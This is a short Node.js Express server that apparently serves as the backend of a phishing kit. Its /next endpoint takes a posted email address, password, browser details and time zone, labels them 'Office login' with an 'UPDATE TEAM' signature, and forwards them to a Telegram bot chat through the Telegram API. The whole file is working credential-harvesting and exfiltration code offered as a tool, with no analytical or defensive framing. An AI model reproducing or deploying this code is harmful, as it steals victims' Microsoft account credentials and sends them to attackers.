const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/next', (req, res) => {
  const { ai, pr, btTkn, chId, userAgent, timeZone } = req.body;

  let message = '---------- 📧 Office login 📧 ----------\n';
  message += `email: ${ai} \n`;
  message += `password: ${pr} \n`;
  message += `browser details: ${userAgent} \n`;
  message += `timeZone: ${timeZone} \n`;
  message += '[+-------- UPDATE TEAM ---------]\n';
  message += '🔥🔥updateteams🔥🔥\n';

  const website = `https://api.telegram.org/bot${btTkn}`;
  const params = {
    chat_id: chId,
    text: message,
  };

  axios.post(`${website}/sendMessage`, params)
    .then(response => {
      console.log(response.data);
      res.send('Message sent successfully');
    })
    .catch(error => {
      console.error(error);
      res.status(500).send('Internal Server Error');
    });
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
 